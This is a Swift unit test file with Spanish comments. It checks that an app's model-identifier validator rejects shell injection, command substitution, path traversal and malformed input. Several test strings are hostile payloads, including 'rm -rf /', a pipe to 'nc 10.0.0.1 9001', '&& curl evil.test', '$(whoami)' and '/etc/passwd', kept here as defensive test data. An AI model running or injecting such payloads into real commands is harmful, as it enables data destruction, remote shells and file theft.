import XCTest
@testable import SplashMonitor

// MARK: - P-03 / H-03: validación de identificadores de modelo

final class ModelIDValidatorTests: XCTestCase {
    
    func testAcceptsRealIdentifiers() {
        XCTAssertTrue(ModelIDValidator.isValid("incoai/Qwen3.8-27B-Splash"))
        XCTAssertTrue(ModelIDValidator.isValid("incoai/Qwen3.8-27B-Splash"))
        XCTAssertTrue(ModelIDValidator.isValid("meta-llama/Llama-3_1-8B"))
        XCTAssertTrue(ModelIDValidator.isValid("  incoai/Qwen3.8-27B-Splash  "))
    }
    
    /// Sonda V-7 de la auditoría: el payload que creó un fichero testigo.
    func testRejectsShellInjectionPayload() {
        let payload = "incoai/x\" ; touch /tmp/splashmonitor_testigo ; echo \""
        XCTAssertFalse(ModelIDValidator.isValid(payload))
        XCTAssertNil(ModelIDValidator.normalized(payload))
        XCTAssertNotNil(ModelIDValidator.rejectionReason(payload))
    }
    
    func testRejectsCommandSubstitutionAndPipes() {
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x$(whoami)"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x`id`"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x; rm -rf /"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x && curl evil.test"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x|nc 10.0.0.1 9001"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x\n--port 1"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/x%2e%2e"))
    }
    
    func testRejectsPathTraversalSegments() {
        XCTAssertFalse(ModelIDValidator.isValid("../.."))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/.."))
        XCTAssertFalse(ModelIDValidator.isValid("./."))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/./x"))
        XCTAssertFalse(ModelIDValidator.isValid("/etc/passwd"))
        XCTAssertFalse(ModelIDValidator.isValid("owner/repo/extra"))
    }
    
    func testRejectsEmptyAndOverlongParts() {
        XCTAssertFalse(ModelIDValidator.isValid(""))
        XCTAssertFalse(ModelIDValidator.isValid("incoai"))
        XCTAssertFalse(ModelIDValidator.isValid("incoai/"))
        XCTAssertFalse(ModelIDValidator.isValid("/Qwen"))
        XCTAssertFalse(ModelIDValidator.isValid(String(repeating: "a", count: 65) + "/model"))
        XCTAssertFalse(ModelIDValidator.isValid("owner/" + String(repeating: "b", count: 97)))
    }
    
    /// Los códigos de barras de la interfaz deben explicar el motivo, no solo negar.
    func testRejectionReasonIsActionable() throws {
        XCTAssertNil(ModelIDValidator.rejectionReason("incoai/Qwen3.8-27B-Splash"))
        XCTAssertEqual(try XCTUnwrap(ModelIDValidator.rejectionReason("")).isEmpty, false)
        let noSlash = try XCTUnwrap(ModelIDValidator.rejectionReason("incoai"))
        XCTAssertTrue(noSlash.contains("propietario/modelo"))
        let injection = try XCTUnwrap(ModelIDValidator.rejectionReason("a/b\"c"))
        XCTAssertTrue(injection.contains("caracteres no permitidos"))
    }
}
